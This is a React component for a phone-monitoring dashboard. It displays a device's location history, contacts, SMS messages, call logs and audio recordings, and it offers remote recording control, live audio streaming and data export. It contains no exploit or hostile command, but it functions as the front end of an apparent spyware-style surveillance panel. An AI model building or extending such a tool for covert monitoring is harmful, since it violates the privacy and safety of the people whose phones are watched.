import React, { useState, useEffect, useMemo } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import DeviceDetailMap from './DeviceDetailMap';
import RecordingControlButton from './RecordingControlButton';
import PhoneNumberModal from './PhoneNumberModal';
import LiveStreamControls from './LiveStreamControls';
import ApiService from '../services/api';
import authService from '../services/authService';
import './DeviceDetail.css';

const DeviceDetail = ({ user }) => {
  const { deviceId } = useParams();
  const navigate = useNavigate();
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [locationData, setLocationData] = useState([]);
  const [recordingEvents, setRecordingEvents] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [showAllNumbers, setShowAllNumbers] = useState(false);
  const [deviceExtendedInfo, setDeviceExtendedInfo] = useState({
    android_id: null,
    phone_numbers: [],
    contacts: []
  });
  const [recordingStatus, setRecordingStatus] = useState(null);
  const [showRenameModal, setShowRenameModal] = useState(false);
  const [newDisplayName, setNewDisplayName] = useState('');
  const [renameError, setRenameError] = useState('');
  const [renameLoading, setRenameLoading] = useState(false);
  
  // Export state
  const [showExportModal, setShowExportModal] = useState(false);
  const [exportLoading, setExportLoading] = useState(false);
  const [exportError, setExportError] = useState('');
  const [exportStartDate, setExportStartDate] = useState('');
  const [exportEndDate, setExportEndDate] = useState('');

  // Phone number modal state
  const [showPhoneModal, setShowPhoneModal] = useState(false);
  const [phoneNumbers, setPhoneNumbers] = useState([]);

  // Memoize initial phone numbers to prevent unnecessary re-renders
  const initialPhoneNumbers = useMemo(() => {
    return phoneNumbers.length > 0 ? phoneNumbers : (deviceExtendedInfo.phone_numbers || []);
  }, [phoneNumbers, deviceExtendedInfo.phone_numbers]);

  // Real-time polling
  useEffect(() => {
    const fetchDeviceData = async () => {
      try {
        // Fetch each endpoint separately to handle partial failures
        const results = await Promise.allSettled([
          ApiService.getDeviceDetails(deviceId),
          ApiService.getDeviceLocationHistory(deviceId, { per_page: 10000 }),
          ApiService.getDeviceRecordingEvents(deviceId),
          ApiService.getDeviceExtendedInfo(deviceId),
          ApiService.getRecordingStatus(deviceId)
        ]);

        const [deviceResponse, locationResponse, eventsResponse, extendedInfoResponse, recordingStatusResponse] = results;

        // Handle device details
        if (deviceResponse.status === 'fulfilled') {
          setDeviceInfo(deviceResponse.value.data);
        } else {
          console.error('Device details failed:', deviceResponse.reason);
          // Check if it's an access denied error
          if (deviceResponse.reason?.message?.includes('Permission denied') || 
              deviceResponse.reason?.message?.includes('Access denied') ||
              deviceResponse.reason?.status === 403) {
            setError('Access denied: You don\'t have permission to view this device. Contact your administrator if you need access.');
            return;
          }
        }

        // Handle location history
        if (locationResponse.status === 'fulfilled') {
          setLocationData(locationResponse.value.data);
        } else {
          console.error('Location history failed:', locationResponse.reason);
          setLocationData([]);
        }

        // Handle recording events
        if (eventsResponse.status === 'fulfilled') {
          setRecordingEvents(eventsResponse.value.data);
        } else {
          console.error('Recording events failed:', eventsResponse.reason);
          setRecordingEvents([]);
        }

        // Handle extended info
        if (extendedInfoResponse.status === 'fulfilled') {
          setDeviceExtendedInfo(extendedInfoResponse.value);
        } else {
          console.error('Extended info failed:', extendedInfoResponse.reason);
          setDeviceExtendedInfo({
            android_id: null,
            phone_numbers: [],
            contacts: []
          });
        }

        // Handle recording status
        if (recordingStatusResponse.status === 'fulfilled') {
          setRecordingStatus(recordingStatusResponse.value.recording_status);
        } else {
          console.error('Recording status failed:', recordingStatusResponse.reason);
          setRecordingStatus(null);
        }

        // Only set error if device details (the most important) failed and it's not an access error
        if (deviceResponse.status === 'rejected' && !error) {
          setError('Failed to load device data');
        } else if (deviceResponse.status === 'fulfilled') {
          setError(null);
        }
      } catch (err) {
        setError('Failed to load device data');
        console.error('Error fetching device data:', err);
      } finally {
        setLoading(false);
      }
    };

    fetchDeviceData();

    // Poll every 10 seconds for real-time updates
    const interval = setInterval(fetchDeviceData, 10000);
    return () => clearInterval(interval);
  }, [deviceId]);

  const handleViewContacts = () => {
    navigate(`/device/${deviceId}/contacts`);
  };

  const handleViewLocationTable = () => {
    navigate(`/device/${deviceId}/location`, {
      state: {
        locationData,
        deviceInfo,
        recordingEvents
      }
    });
  };

  const handleViewAudioTable = () => {
    navigate(`/device/${deviceId}/recordings`, {
      state: {
        recordingEvents,
        deviceInfo,
        locationData
      }
    });
  };

  const handleViewSmsTable = () => {
    navigate(`/device/${deviceId}/sms`, {
      state: {
        deviceInfo,
        deviceId
      }
    });
  };

  const handleViewCallLogsTable = () => {
    navigate(`/device/${deviceId}/call_logs`, {
      state: {
        deviceInfo,
        deviceId
      }
    });
  };

  const handleViewExternalStorage = () => {
    navigate(`/device/${deviceId}/external-storage`, {
      state: {
        deviceInfo,
        deviceId
      }
    });
  };

  const handleRecordingStatusChange = (deviceId, updatedRecordingStatus) => {
    setRecordingStatus(updatedRecordingStatus);
  };

  const canRenameDevice = () => {
    return user?.role === 'super_super_admin' || user?.role === 'super_user';
  };

  const handleRenameDevice = async () => {
    if (!newDisplayName.trim()) {
      setRenameError('Display name cannot be empty');
      return;
    }

    setRenameLoading(true);
    setRenameError('');

    try {
      const response = await authService.authenticatedFetch(`/api/device/${deviceId}/rename`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ display_name: newDisplayName.trim() })
      });

      if (response.ok) {
        const data = await response.json();
        setDeviceInfo(prev => ({ ...prev, display_name: data.display_name }));
        setShowRenameModal(false);
        setNewDisplayName('');
      } else {
        const errorData = await response.json();
        setRenameError(errorData.error || 'Failed to rename device');
      }
    } catch (error) {
      setRenameError('Network error. Please try again.');
    } finally {
      setRenameLoading(false);
    }
  };

  const handleResetDeviceName = async () => {
    setRenameLoading(true);
    setRenameError('');

    try {
      const response = await authService.authenticatedFetch(`/api/device/${deviceId}/reset-name`, {
        method: 'PUT'
      });

      if (response.ok) {
        const data = await response.json();
        setDeviceInfo(prev => ({ ...prev, display_name: data.display_name }));
        setShowRenameModal(false);
        setNewDisplayName('');
      } else {
        const errorData = await response.json();
        setRenameError(errorData.error || 'Failed to reset device name');
      }
    } catch (error) {
      setRenameError('Network error. Please try again.');
    } finally {
      setRenameLoading(false);
    }
  };

  // Export functionality
  const canExportDevice = () => {
    // Operators cannot export, analysts can export assigned devices, super users can export any device
    return user?.role !== 'operator';
  };

  const handleExportDevice = async () => {
    setExportLoading(true);
    setExportError('');

    try {
      const response = await ApiService.exportDeviceData(deviceId, exportStartDate, exportEndDate);
      
      // Create blob and download
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      
      // Generate filename
      const today = new Date().toISOString().split('T')[0];
      const deviceName = deviceInfo?.display_name || deviceId;
      a.download = `${deviceName}_data_export_${today}.xlsx`;
      
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
      
      // Close modal and reset form
      setShowExportModal(false);
      setExportStartDate('');
      setExportEndDate('');
      
      // Show success message (you might want to add a toast notification here)
      console.log('Device data exported successfully');
      
    } catch (error) {
      setExportError(error.message || 'Failed to export device data');
    } finally {
      setExportLoading(false);
    }
  };

  const getRecordingState = () => {
    if (!recordingStatus) return 'idle';
    
    // Handle offline devices
    if (!recordingStatus.can_control && recordingStatus.last_seen_minutes > 7) {
      return 'offline';
    }
    
    return recordingStatus.recording_state;
  };

  const togglePhoneNumbers = () => {
    setShowAllNumbers(!showAllNumbers);
  };

  const handleSavePhoneNumbers = async (newPhoneNumbers) => {
    try {
      const response = await ApiService.updateDevicePhoneNumbers(deviceId, newPhoneNumbers);
      if (response.success) {
        setPhoneNumbers(newPhoneNumbers);
        // Also update the deviceExtendedInfo to reflect the change
        setDeviceExtendedInfo(prev => ({
          ...prev,
          phone_numbers: newPhoneNumbers
        }));
      }
    } catch (error) {
      console.error('Failed to save phone numbers:', error);
      throw error;
    }
  };

  const renderPhoneNumbers = () => {
    const currentPhoneNumbers = phoneNumbers.length > 0 ? phoneNumbers : (deviceExtendedInfo.phone_numbers || []);
    
    if (currentPhoneNumbers.length === 0) {
      return (
        <div className="phone-input-container">
          <input 
            type="text" 
            placeholder="Enter phone number(s)" 
            className="phone-input-field"
            readOnly
            onClick={() => setShowPhoneModal(true)}
          />
          <button 
            className="phone-edit-btn" 
            onClick={() => setShowPhoneModal(true)}
            title="Add phone numbers"
          >
            ✏️
          </button>
        </div>
      );
    }

    return (
      <div className="phone-display-container">
        <span className="phone-display">
          {currentPhoneNumbers.join(', ')}
        </span>
        <button 
          className="phone-edit-btn" 
          onClick={() => setShowPhoneModal(true)}
          title="Edit phone numbers"
        >
          ✏️
        </button>
      </div>
    );
  };

  const getBatteryClass = (batteryLevel) => {
    if (batteryLevel >= 60) return 'battery-high';
    if (batteryLevel >= 30) return 'battery-medium';
    return 'battery-low';
  };

  const getBatteryIcon = (batteryLevel, isCharging) => {
    if (isCharging) return '🔋'; // Charging icon
    if (batteryLevel >= 75) return '🔋'; // Full battery
    if (batteryLevel >= 50) return '🔋'; // Medium battery
    if (batteryLevel >= 25) return '🔋'; // Low battery
    return '🪫'; // Very low battery
  };

  if (loading) {
    return (
      <div className="device-detail-container">
        <div className="loading-device">
          <div className="spinner"></div>
          <p>Loading device details...</p>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="device-detail-container">
        <div className="error-state">
          <h2>❌ Error</h2>
          <p>{error}</p>
          <button onClick={() => navigate('/')} className="btn btn-secondary">
            ← Back to Dashboard
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="device-detail-container">
      {/* Header */}
      <div className="device-header">
        <button onClick={() => navigate('/')} className="back-button">
          ← Back to Dashboard
        </button>
        <div className="device-title">
          <h1>📱 {deviceInfo?.display_name || deviceId}</h1>
          
          {/* Battery Indicator */}
          {deviceExtendedInfo?.battery?.level !== null && deviceExtendedInfo?.battery?.level !== undefined && (
            <div 
              className={`battery-indicator ${deviceExtendedInfo.battery.is_charging ? 'battery-charging' : ''} ${deviceExtendedInfo.battery.level < 15 ? 'battery-critical' : ''}`}
              title={`Battery: ${deviceExtendedInfo.battery.level}%
${deviceExtendedInfo.battery.is_charging ? `Charging via ${deviceExtendedInfo.battery.charging_method || 'Unknown'}` : 'Not charging'}
Health: ${deviceExtendedInfo.battery.health || 'Unknown'}
${deviceExtendedInfo.battery.temperature ? `Temperature: ${deviceExtendedInfo.battery.temperature}°C` : ''}
${deviceExtendedInfo.battery.voltage ? `Voltage: ${deviceExtendedInfo.battery.voltage}mV` : ''}
${deviceExtendedInfo.battery.last_updated ? `Updated: ${new Date(deviceExtendedInfo.battery.last_updated).toLocaleString()}` : ''}`}
            >
              <span className={`battery-level ${getBatteryClass(deviceExtendedInfo.battery.level)}`}>
                {getBatteryIcon(deviceExtendedInfo.battery.level, deviceExtendedInfo.battery.is_charging)} 
                {deviceExtendedInfo.battery.level}%
              </span>
              {deviceExtendedInfo.battery.is_charging && (
                <span className="charging-indicator" title={`Charging via ${deviceExtendedInfo.battery.charging_method || 'Unknown'}`}>
                  ⚡
                </span>
              )}
            </div>
          )}
          
          <div className="device-title-actions">
            {canRenameDevice() && (
              <button 
                className="btn btn-sm btn-secondary rename-btn"
                onClick={() => {
                  setNewDisplayName(deviceInfo?.display_name || '');
                  setShowRenameModal(true);
                  setRenameError('');
                }}
                title="Rename Device"
              >
                ✏️ Rename
              </button>
            )}
            
            {canExportDevice() && (
              <button 
                className="btn btn-sm btn-primary export-btn"
                onClick={() => {
                  setShowExportModal(true);
                  setExportError('');
                }}
                title="Export Device Data"
              >
                📤 Export Data
              </button>
            )}
          </div>
        </div>
      </div>

      {/* Rename Device Modal */}
      {showRenameModal && (
        <div className="modal-overlay">
          <div className="modal-content rename-modal">
            <div className="modal-header">
              <h3>Rename Device</h3>
              <button 
                className="close-btn"
                onClick={() => {
                  setShowRenameModal(false);
                  setRenameError('');
                }}
              >
                ×
              </button>
            </div>
            
            <div className="modal-body">
              <div className="form-group">
                <label htmlFor="displayName">Display Name:</label>
                <input
                  id="displayName"
                  type="text"
                  value={newDisplayName}
                  onChange={(e) => setNewDisplayName(e.target.value)}
                  placeholder="Enter device display name"
                  maxLength={100}
                  disabled={renameLoading}
                />
                <small className="help-text">
                  This name will be displayed instead of the device ID. Original device ID: {deviceId}
                </small>
              </div>
              
              {renameError && (
                <div className="error-message">
                  {renameError}
                </div>
              )}
            </div>
            
            <div className="modal-footer">
              <button
                className="btn btn-secondary"
                onClick={() => {
                  setShowRenameModal(false);
                  setRenameError('');
                }}
                disabled={renameLoading}
              >
                Cancel
              </button>
              <button
                className="btn btn-warning"
                onClick={handleResetDeviceName}
                disabled={renameLoading}
              >
                {renameLoading ? 'Resetting...' : 'Reset to Original'}
              </button>
              <button
                className="btn btn-primary"
                onClick={handleRenameDevice}
                disabled={renameLoading || !newDisplayName.trim()}
              >
                {renameLoading ? 'Saving...' : 'Save Name'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Export Device Data Modal */}
      {showExportModal && (
        <div className="modal-overlay">
          <div className="modal-content export-modal">
            <div className="modal-header">
              <h3>📤 Export Device Data</h3>
              <button 
                className="close-btn"
                onClick={() => {
                  setShowExportModal(false);
                  setExportError('');
                }}
              >
                ×
              </button>
            </div>
            
            <div className="modal-body">
              <div className="export-info">
                <p><strong>Device:</strong> {deviceInfo?.display_name || deviceId}</p>
                <p><strong>Export Format:</strong> Excel (.xlsx)</p>
                <p><strong>Data Included:</strong> Locations, Recordings, Contacts</p>
              </div>
              
              <div className="form-group">
                <label htmlFor="startDate">Start Date (Optional):</label>
                <input
                  id="startDate"
                  type="date"
                  value={exportStartDate}
                  onChange={(e) => setExportStartDate(e.target.value)}
                  disabled={exportLoading}
                  max={exportEndDate || new Date().toISOString().split('T')[0]}
                />
              </div>
              
              <div className="form-group">
                <label htmlFor="endDate">End Date (Optional):</label>
                <input
                  id="endDate"
                  type="date"
                  value={exportEndDate}
                  onChange={(e) => setExportEndDate(e.target.value)}
                  disabled={exportLoading}
                  min={exportStartDate}
                  max={new Date().toISOString().split('T')[0]}
                />
              </div>
              
              <div className="help-text">
                <small>
                  Leave dates empty to export all historical data. Export includes all device data across multiple Excel tabs.
                </small>
              </div>
              
              {exportError && (
                <div className="error-message">
                  {exportError}
                </div>
              )}
            </div>
            
            <div className="modal-footer">
              <button
                className="btn btn-secondary"
                onClick={() => {
                  setShowExportModal(false);
                  setExportError('');
                }}
                disabled={exportLoading}
              >
                Cancel
              </button>
              <button
                className="btn btn-primary"
                onClick={handleExportDevice}
                disabled={exportLoading}
              >
                {exportLoading ? '📤 Exporting...' : '📤 Export Excel File'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Device Info Summary */}
      <div className="device-summary">
        <div className="summary-card">
          <h3>📊 Device Summary</h3>
          
          {/* Show info message if no device data */}
          {(!deviceExtendedInfo.android_id && 
            (!deviceExtendedInfo.phone_numbers || deviceExtendedInfo.phone_numbers.length === 0) && 
            (!deviceExtendedInfo.contacts || deviceExtendedInfo.contacts.length === 0)) && (
            <div className="device-info-notice">
              <p>ℹ️ <strong>Device Information Not Available</strong></p>
              <p>This device hasn't synced its information yet. Device details (Android ID, phone numbers, contacts) will appear here once the device uploads its data.</p>
            </div>
          )}
          
          {/* Row 1: Data Display */}
          <div className="summary-row summary-data-row">
            <div className="summary-item">
              <span className="item-label">Current Location:</span>
              <span className="item-value">
                {deviceInfo?.location?.lat && deviceInfo?.location?.lng 
                  ? `${deviceInfo.location.lat.toFixed(4)}, ${deviceInfo.location.lng.toFixed(4)}`
                  : 'Location not available'
                }
              </span>
            </div>
            <div className="summary-item">
              <span className="item-label">Total Recordings:</span>
              <span className="item-value">{recordingEvents.length}</span>
            </div>
            <div className="summary-item">
              <span className="item-label">Last Seen:</span>
              <span className="item-value">{deviceInfo?.last_seen || 'Never'}</span>
            </div>
            <div className="summary-item">
              <span className="item-label">Android ID:</span>
              <span className="item-value">{deviceExtendedInfo.android_id || 'Not available - Device not synced'}</span>
            </div>
          </div>

          {/* Row 2: Action Buttons */}
          <div className="summary-row summary-actions-row">
            <div className="summary-item">
              <span className="item-label">Recording Control:</span>
              <div className="item-value">
                <RecordingControlButton
                  deviceId={deviceId}
                  initialStatus={getRecordingState()}
                  onStatusChange={handleRecordingStatusChange}
                  disabled={loading}
                />
              </div>
            </div>
            <div className="summary-item">
              <span className="item-label">Phone Numbers:</span>
              <div className="item-value">
                {renderPhoneNumbers()}
              </div>
            </div>
            <div className="summary-item">
              <button 
                className="summary-btn btn-contacts" 
                onClick={handleViewContacts}
                title={deviceExtendedInfo.contacts?.length === 0 ? "No contacts available - Device needs to sync" : ""}
              >
                📞 View Contacts ({deviceExtendedInfo.contacts?.length || 0})
                {deviceExtendedInfo.contacts?.length === 0 && <span className="sync-indicator"> - Not synced</span>}
              </button>
            </div>
            <div className="summary-item">
              <button 
                className="summary-btn btn-location-table" 
                onClick={handleViewLocationTable}
              >
                📍 Location Table
              </button>
            </div>
            <div className="summary-item">
              <button 
                className="summary-btn btn-audio-table" 
                onClick={handleViewAudioTable}
              >
                🎵 Audio Recordings
              </button>
            </div>
            <div className="summary-item">
              <button 
                className="summary-btn btn-sms-table" 
                onClick={handleViewSmsTable}
              >
                💬 SMS Messages
              </button>
            </div>
            <div className="summary-item">
              <button 
                className="summary-btn btn-call-logs-table" 
                onClick={handleViewCallLogsTable}
              >
                📞 Call Logs
              </button>
            </div>
            {/* External Storage button - hidden but implementation preserved */}
            <div className="summary-item" style={{ display: 'none' }}>
              <button 
                className="summary-btn btn-external-storage" 
                onClick={handleViewExternalStorage}
              >
                📁 External Storage
              </button>
            </div>
          </div>
          
          {/* Live Audio Streaming Controls */}
          <div className="device-controls-section">
            <LiveStreamControls deviceId={deviceId} deviceInfo={deviceInfo} />
          </div>
        </div>
      </div>

      {/* Device Location Map */}
      <DeviceDetailMap deviceId={deviceId} />

      {/* Phone Number Modal */}
      <PhoneNumberModal
        isOpen={showPhoneModal}
        onClose={() => setShowPhoneModal(false)}
        onSave={handleSavePhoneNumbers}
        initialPhoneNumbers={initialPhoneNumbers}
        deviceId={deviceId}
      />
    </div>
  );
};

export default DeviceDetail;
